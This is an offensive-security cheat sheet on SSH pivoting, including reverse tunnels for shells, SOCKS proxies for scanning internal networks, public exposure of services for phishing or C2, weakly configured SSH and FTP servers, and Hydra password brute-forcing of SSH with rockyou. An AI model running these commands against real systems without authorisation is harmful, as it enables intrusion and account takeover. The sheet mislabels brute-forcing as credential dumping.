# SSH PIVOTING, SERVERS & INFRASTRUCTURE CHEAT SHEET

## 1. WHAT IS THIS?

Everything you need to **pivot through, host, or expose services** via SSH. Topics:

- **SSH tunnels** (local, remote, dynamic, reverse)
- **Public server exposure** (ngrok, cloudflared, playit)
- **Setting up SSH/FTP servers**
- **Dumping credentials** via Hydra (SSH)
- **Legacy SSH algorithms**

**Key fact:** SSH is the most powerful pivot tool on Linux. Master `-L`, `-R`, `-D` and `-N`.

---

## 2. SSH TUNNELS

### 2.1 Local Port Forwarding (-L)

Redirect a **local port** to a **remote service** through SSH.

```bash
# Access remote 10.0.0.1:80 via local port 8585
ssh -N -L 8585:10.0.0.1:80 user@jump-host

# All interfaces (external pivoting)
ssh -N -L *:8585:10.0.0.1:80 user@jump-host

# Multiple forwards
ssh -N -L 8080:internal:80 -L 3306:internal:3306 user@jump-host

# Background + no command
ssh -f -N -L *:9393:localhost:9392 user@192.168.100.211
ssh -f -N -L *:PUERTO_PUBLICO:localhost:PUERTO_LOCAL USUARIO@IP
```

### 2.2 Remote Port Forwarding (-R) — Reverse Tunnel

Expose a **local service** to the **remote side**.

```bash
# Target's port 9000 → your local 3000
ssh -N -R 9000:localhost:3000 user@target

# Reverse bind on all interfaces
ssh -N -R *:8000:localhost:8000 user@192.168.100.125

# Reverse shell via SSH tunnel
ssh -N -R 4444:localhost:4444 user@target

# Expose local HTTP server through SSH
python3 -m http.server 8000
ssh -N -R 80:localhost:8000 root@192.168.100.112
```

### 2.3 Dynamic SOCKS Proxy (-D)

```bash
ssh -D 1080 -C -q -N user@192.168.0.87
proxychains firefox
proxychains nmap -sT -Pn 10.0.0.0/24
proxychains curl http://internal-service
```

### 2.4 Common Pivoting Examples

```bash
ssh -N -L 3389:10.0.0.20:3389 user@jump-host
ssh -N -L 3306:10.0.0.30:3306 user@jump-host
ssh -N -L *:8585:0.0.0.0:8006 root@192.168.0.5
```

### 2.5 Legacy Algorithms (Old Targets)

```bash
ssh -oKexAlgorithms=curve25519-sha256 user@10.129.8.178
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@target
ssh -oHostKeyAlgorithms=+ssh-rsa user@target
ssh -oCiphers=+aes128-cbc user@target
ssh -l user -p 64295 192.168.0.80
```

---

## 3. PUBLIC SERVER EXPOSURE

Expose your local service to the internet (for phishing, C2, or OOB testing).

```bash
# ngrok
ngrok http 8000

# cloudflared
cloudflared tunnel --url http://localhost:8000

# playit
playit
```

### Firewall for exposed ports

```bash
sudo ufw allow 8000
```

---

## 4. SSH SERVER SETUP

### 4.1 Install and Enable

```bash
sudo apt update
sudo apt install openssh-server -y
sudo systemctl start ssh
sudo systemctl enable ssh
sudo systemctl status ssh
```

### 4.2 Configure /etc/ssh/sshd_config

```ini
PermitRootLogin yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTunnel yes
```

### 4.3 Apply and Open Firewall

```bash
sudo systemctl restart ssh
sudo ufw allow 22/tcp
ss -tulnp
```

### 4.4 Fix Host Key Warning

```bash
ssh-keygen -R 192.168.100.125
```

---

## 5. FTP SERVER SETUP (vsftpd)

```bash
sudo adduser ftpuser
sudo passwd ftpuser

sudo apt update
sudo apt install vsftpd
sudo systemctl enable vsftpd
sudo systemctl start vsftpd

sudo nano /etc/vsftpd.conf
```

Config:
```ini
write_enable=YES
local_enable=YES
chroot_local_user=YES
allow_writeable_chroot=YES
```

---

## 6. DUMPING SSH CREDENTIALS (HYDRA)

```bash
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
hydra -l <user> -P rockyou.txt ssh://<IP>
hydra -l root -P rockyou.txt ssh://192.168.0.80
```
